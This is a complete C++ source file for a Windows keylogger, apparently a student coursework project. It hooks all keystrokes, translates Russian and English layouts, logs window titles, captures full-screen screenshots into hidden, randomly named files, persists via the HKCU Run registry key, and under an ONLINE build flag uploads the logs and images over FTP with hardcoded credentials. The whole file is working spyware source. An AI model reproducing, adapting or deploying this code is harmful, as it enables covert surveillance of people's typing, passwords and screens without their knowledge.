#include <string>
#include <Windows.h>
#include <gdiplus.h>
#include <fstream>
#include <stdio.h>
#include <Winuser.h>
#include <locale.h>
#include <random>
#include <wininet.h>

#pragma comment(lib, "GdiPlus.lib")
#pragma comment(lib, "WinINet.lib")

#define RUS 0x0419
#define ENG 0x0409

#define MAXAMOUNTOFIMAGES 10
LPWSTR names[MAXAMOUNTOFIMAGES];
LPWSTR keyboardInput;

using namespace Gdiplus;
using std::ofstream;
using std::ifstream;
using std::endl;
using std::string;

HWND wndHwnd;
HHOOK hHook;
KBDLLHOOKSTRUCT kbStruct;
ofstream file;
string input;
SYSTEMTIME currentTime;
SYSTEMTIME previousTime;
SYSTEMTIME startTime;
bool start = true;
bool reload = false;
int currentLayout;
bool isWindowChanged = false;
char prevWind[256] = { 0 };
char curWind[256] = { 0 };
int curImage = 0;
RECT rect = { 0, 40, 0, 900 };
RECT rectScreenShot = { 0, 0, 0, 0 };
int widthOfScreen;
int heightOfScreen;

bool showWindow = false;

#ifdef ONLINE
HINTERNET hFileTranferCall;
HINTERNET hFTP;
#endif


LPWSTR MakeRandomFileName(int sizeOfName, LPCWSTR typeName, int sizeOfTypeName) {

    const int pathSize = 7;
    wchar_t path [pathSize] = L"C:\\CW\\";
    LPWSTR string = new wchar_t[sizeOfName + sizeOfTypeName + pathSize];
    for (int i = 0; i < pathSize-1; i++) {
        string[i] = path[i];
    }
    for (int i = 0; i < sizeOfName; i++) {
        string[i + pathSize-1] = static_cast<wchar_t>(rand()%25+65);
    }
    for (int i = 0; i < sizeOfTypeName; i++) {
        string[i+ sizeOfName + pathSize - 1] = typeName[i];
    }
    return string;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) //проверка наличие кодека в системе, если он есть, то вернёт его айди
{
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}




BOOL IsCaps(void)
{
    //GetKeyState используеться в основном для определения состояния нажатия системной кнопки
    //VK - Virtual Key
    if ((GetKeyState(VK_CAPITAL) & 0x0001) ^
        (GetKeyState(VK_SHIFT) & 0x8000))
        return TRUE;
    return FALSE;

}


char TranslateChar(int & key) {
    if (currentLayout == RUS) {
        switch (static_cast<char> (key)) {
        case 'Q':
            if (IsCaps()) return 'Й';
            else return 'й';
            break;
        case 'W':
            if (IsCaps()) return 'Ц';
            else return 'ц';
            break;
        case 'E':
            if (IsCaps()) return 'У';
            else return 'у';
            break;
        case 'R':
            if (IsCaps()) return 'К';
            else return 'к';
            break;
        case 'T':
            if (IsCaps()) return 'Е';
            else return 'е';
            break;
        case 'Y':
            if (IsCaps()) return 'Н';
            else return 'н';
            break;
        case 'U':
            if (IsCaps()) return 'Г';
            else return 'г';
            break;
        case 'I':
            if (IsCaps()) return 'Ш';
            else return 'ш';
            break;
        case 'O':
            if (IsCaps()) return 'Щ';
            else return 'щ';
            break;
        case 'P':
            if (IsCaps()) return 'З';
            else return 'з';
            break;
        case 'A':
            if (IsCaps()) return 'Ф';
            else return 'ф';
            break;
        case 'S':
            if (IsCaps()) return 'Ы';
            else return 'ы';
            break;
        case 'D':
            if (IsCaps()) return 'В';
            else return 'в';
            break;
        case 'F':
            if (IsCaps()) return 'А';
            else return 'а';
            break;
        case 'G':
            if (IsCaps()) return 'П';
            else return 'п';
            break;
        case 'H':
            if (IsCaps()) return 'Р';
            else return 'р';
            break;
        case 'J':
            if (IsCaps()) return 'О';
            else return 'о';
            break;
        case 'K':
            if (IsCaps()) return 'Л';
            else return 'л';
            break;
        case 'L':
            if (IsCaps()) return 'Д';
            else return 'д';
            break;
        case 'Z':
            if (IsCaps()) return 'Я';
            else return 'я';
            break;
        case 'X':
            if (IsCaps()) return 'Ч';
            else return 'ч';
            break;
        case 'C':
            if (IsCaps()) return 'С';
            else return 'с';
            break;
        case 'V':
            if (IsCaps()) return 'М';
            else return 'м';
            break;
        case 'B':
            if (IsCaps()) return 'И';
            else return 'и';
            break;
        case 'N':
            if (IsCaps()) return 'Т';
            else return 'т';
            break;
        case 'M':
            if (IsCaps()) return 'Ь';
            else return 'ь';
            break;
        case VK_OEM_COMMA:
            if (IsCaps()) return 'Б';
            else return 'б';
            break;
        case '.':
            if (IsCaps()) return 'Ю';
            else return 'ю';
            break;
        case '/':
            if (IsCaps()) return ',';
            else return '.';
            break;
        case ';':
            if (IsCaps()) return 'Ж';
            else return 'ж';
            break;
        case '\'':
            if (IsCaps()) return 'Э';
            else return 'э';
            break;
        case '[':
            if (IsCaps()) return 'Х';
            else return 'х';
            break;
        case ']':
            if (IsCaps()) return 'Ъ';
            else return 'ъ';
            break;
        }
    }

    return static_cast<char> (key);

}

string InterpreteKey(int& key) {
    string result;

    if (key == VK_BACK) result = "[BACKSPACE]";
    else if (key == VK_LMENU) result = "[ALT]";
    else if (key == VK_RETURN) result = "[ENTER]";
    else if (key == VK_SPACE) result = " ";
    else if (key == VK_TAB) result = /*"[TAB]"*/"";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) result = /*"[SHIFT]"*/ "";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) result = "[CONTROL]";
    else if (key == VK_ESCAPE) result = "[ESC]";
    else if (key == VK_END) result = "[END]";
    else if (key == VK_HOME) result = "[HOME]";
    else if (key == VK_LEFT) result = "[LEFT]";
    else if (key == VK_RIGHT) result = "[RIGHT]";
    else if (key == VK_UP) result = "[UP]";
    else if (key == VK_DOWN) result = "[DOWN]";
    else if (key == 190 || key == 110) result = ".";
    else if (key == 189 || key == 109) result = "-";
    else if (key == VK_CAPITAL) result = /*"[CAPS]"*/ "";
    else {
        if (IsCaps() == TRUE) {
            switch (static_cast<char> (key))
            {
            case '1':
                result = '!';
                break;
            case '2':
                if (currentLayout == ENG)
                    result = "@";
                else if (currentLayout == RUS)
                    result = "\"";
                break;
            case '3':
                if (currentLayout == ENG)
                    result = "#";
                else if (currentLayout == RUS)
                    result = "№";
                break;
            case '4':
                if (currentLayout == ENG)
                    result = "$";
                else if (currentLayout == RUS)
                    result = ";";
                    break;
            case '5':
                result = "%";
                break;
            case '6':
                if (currentLayout == ENG)
                    result = "^";
                else if (currentLayout == RUS)
                    result = ":";
            case '7':
                if (currentLayout == ENG)
                    result = "&";
                else if (currentLayout == RUS)
                    result = "?";
                break;
            case '8':
                result = "*";
                break;
            case '9':
                result = "(";
                break;
            case '0':
                result = ")";
                break;
            case '-':
                result = "_";
                break;
            case '=':
                result = "+";
                break;
            case '[':
                if (currentLayout == ENG)
                    result = "{";
                else if (currentLayout == RUS)
                    result = "Х";
                break;
            case ']':
                if (currentLayout == ENG)
                    result = "}";
                else if (currentLayout == RUS)
                    result = "Ъ";
                break;
            case ';':
                if (currentLayout == ENG)
                    result = ":";
                else if (currentLayout == RUS)
                    result = "Ж";
                break;
            case '\'':
                if (currentLayout == ENG)
                    result = "\"";
                else if (currentLayout == RUS)
                    result = "Ж";
                break;
            case VK_OEM_COMMA:
                if (currentLayout == ENG)
                    result = "<";
                else if (currentLayout == RUS)
                    result = "Б";
                break;
            case '.':
                if (currentLayout == ENG)
                    result = ">";
                else if (currentLayout == RUS)
                    result = "Ю";
                break;
            case '/':
                if (currentLayout == ENG)
                    result = "?";
                else if (currentLayout == RUS)
                    result = ",";
                break;
            case '\\':
                if (currentLayout == ENG)
                    result = "|";
                else if (currentLayout == RUS)
                    result = "/";
                break;
            case '`':
                if (currentLayout == ENG)
                    result = "~";
                else if (currentLayout == RUS)
                    result = "Ё";
                break;
            default:
                result += TranslateChar(key);
                break;
            }
        }
        else {
            result += static_cast<char>(tolower(static_cast<int>(TranslateChar(key))));
        }
    }
    return result;
}

void SaveInput(int key) {

    wchar_t* wndOutput = nullptr;
    DWORD threadID;
    HWND hForeground = GetForegroundWindow();
    if (hForeground) {
        threadID = GetWindowThreadProcessId(hForeground, NULL);
        currentLayout = LOWORD(GetKeyboardLayout(threadID));
        GetWindowTextA(hForeground, curWind, 256);
        if (strcmp(curWind, prevWind) != 0) {
            isWindowChanged = true;
            strcpy_s(prevWind, curWind);
        }
    }
    GetLocalTime(&currentTime);

    if (reload) {
        startTime = currentTime;
        reload = false;
    }

    if (start) {
        input += InterpreteKey(key);
        start = false;
        return;
    }

    if ((currentTime.wSecond+currentTime.wMinute*60) - (previousTime.wSecond+previousTime.wMinute*60) < 3 and !isWindowChanged and (InterpreteKey(key) != "[ENTER]")) {
            input += InterpreteKey(key);
    }
    else {

        if (input != "") {

            if (curImage > MAXAMOUNTOFIMAGES-1) curImage = 0;

            #ifdef ONLINE
            FtpSetCurrentDirectoryA(hFTP, "/FTP");
            #endif

            file.open(keyboardInput, ofstream::app);
            SetFileAttributes(keyboardInput, FILE_ATTRIBUTE_HIDDEN);

            string time;
            if (startTime.wMinute > 9) {
                time = std::to_string(startTime.wHour) + ":" + std::to_string(startTime.wMinute);
            }
            else {
                time = std::to_string(startTime.wHour) + ":" + '0' + std::to_string(startTime.wMinute);
            }
            if (startTime.wSecond > 9) {
                time += ":" + std::to_string(startTime.wSecond);
            }
            else {
                time += ":0" + std::to_string(startTime.wSecond);
            }
            input = input + " | " + time;
            file << input << endl;
            if (isWindowChanged) file << curWind << endl;

            file.close();

            HDC wndDC = GetWindowDC(wndHwnd);

            if (showWindow) {
                wndOutput = new wchar_t[input.size()];
                MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, input.c_str(), static_cast<int>(input.size()), wndOutput, static_cast<int>(input.size()));
                SetTextColor(wndDC, 0x00000000);
                DrawText(wndDC, wndOutput, static_cast<int>(input.size()), &rect, DT_TOP);
                rect.top += 40;
                if (rect.top > heightOfScreen-40) rect.top = 40;
                delete[] wndOutput;
                wndOutput = nullptr;
            }

            input = "";
            input += InterpreteKey(key);
            reload = true;

            HDC hScreen = GetDC(NULL); //создаю контекст всего экрана
            HDC hDC = CreateCompatibleDC(hScreen); //создаю контекст совместимый с контекстом экрана 
            HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, widthOfScreen, heightOfScreen); //создаю карту пикселей (изображение) для экрана.
            SelectObject(hDC, hBitmap);
            BitBlt(hDC, 0, 0, widthOfScreen, heightOfScreen, hScreen, rectScreenShot.left, rectScreenShot.bottom, SRCCOPY); //передаю цвета экрана в изображение
            if (hBitmap) // сохранения полученной картинки в файл
            {
                Bitmap bmp(hBitmap, nullptr);
                CLSID pngClsid;
                GetEncoderClsid(L"image/png", &pngClsid); //проверка на наличие кодека, если его нету, то ничего не будет
                bmp.Save(names[curImage], &pngClsid, NULL);
                SetFileAttributes(names[curImage], FILE_ATTRIBUTE_HIDDEN);

                if (showWindow) {
                    StretchBlt(wndDC, 0, 0, widthOfScreen*0.8, heightOfScreen*0.8, hDC, 0, 0, rectScreenShot.right, rectScreenShot.top, SRCCOPY);
                }

                #ifdef ONLINE
                FtpPutFile(hFTP, names[curImage], names[curImage], NULL, NULL);
                #endif

                curImage++;
            }

            DeleteDC(wndDC);
            DeleteDC(hDC);
            DeleteDC(hScreen);
            DeleteObject(hBitmap);

            if (isWindowChanged) isWindowChanged = false;

            #ifdef ONLINE
            FtpPutFile(hFTP, keyboardInput, keyboardInput, NULL, NULL);
            #endif

            if (wndOutput != nullptr) delete[] wndOutput;
        }
    }

    previousTime = currentTime;
    
}

LRESULT CALLBACK LogKey(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_KEYDOWN)
    {
        kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
        SaveInput((kbStruct.vkCode));
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

LRESULT CALLBACK WindowBehaviour(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {

    switch (uMsg) {
    case WM_CREATE:
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {

    ifstream windowMode;
    windowMode.open("C:\\CW\\admin.txt");
    if (windowMode.is_open()) {
        showWindow = true;
        wchar_t className[] = L"StealthClient";
        WNDCLASS mainWindow = {};
        mainWindow.hInstance = hInstance;
        mainWindow.hbrBackground = (HBRUSH)COLOR_WINDOW;
        mainWindow.hIcon = LoadIcon(NULL, IDI_APPLICATION);
        mainWindow.lpszClassName = className;
        mainWindow.hCursor = LoadCursor(NULL, IDC_ARROW);
        mainWindow.lpfnWndProc = WindowBehaviour;
        RegisterClass(&mainWindow);
        wndHwnd = CreateWindow(className, L"Stealth-Клиент", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);
    }
    else {
        showWindow = false;
    }
    windowMode.close();

    HKEY hKey;
    char szPath[0x100];
    GetModuleFileNameA(NULL, szPath, sizeof(szPath));
    RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (hKey)
    {
        RegSetValueExA(hKey, "CourseWork", NULL, REG_SZ, (LPBYTE)szPath, DWORD(strlen(szPath)));
        RegCloseKey(hKey);
    }

    SYSTEMTIME CurTime;
    GetLocalTime(&CurTime);
    srand(CurTime.wMilliseconds);

    CreateDirectoryA("C:\\CW\\", NULL);
    SetFileAttributes(L"C:\\CW", FILE_ATTRIBUTE_HIDDEN);

    for (int i = 0; i < MAXAMOUNTOFIMAGES; i++) {
        names[i] = MakeRandomFileName(10, L".png", 5);
    }
    keyboardInput = MakeRandomFileName(5, L".txt", 5);

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    #ifdef ONLINE
    hFileTranferCall = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    while (true) {
        hFTP = InternetConnectA(hFileTranferCall, "127.0.0.1", INTERNET_DEFAULT_FTP_PORT, "anonymous", "azaza1234", INTERNET_SERVICE_FTP, NULL, NULL);
        if (hFTP == NULL) {
            Sleep(1000);
        }
        else break;
    }
    #endif

    rectScreenShot.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    rectScreenShot.bottom = GetSystemMetrics(SM_YVIRTUALSCREEN);
    rectScreenShot.right = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    rectScreenShot.top = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    widthOfScreen = rectScreenShot.right - rectScreenShot.left;
    heightOfScreen = rectScreenShot.top - rectScreenShot.bottom;
    rect.left = widthOfScreen * 0.81;
    rect.right = widthOfScreen;
    rect.top = heightOfScreen;



    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LogKey, NULL, NULL);
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        DispatchMessage(&msg);
        TranslateMessage(&msg);
    }

    GdiplusShutdown(gdiplusToken);


	return 0;
}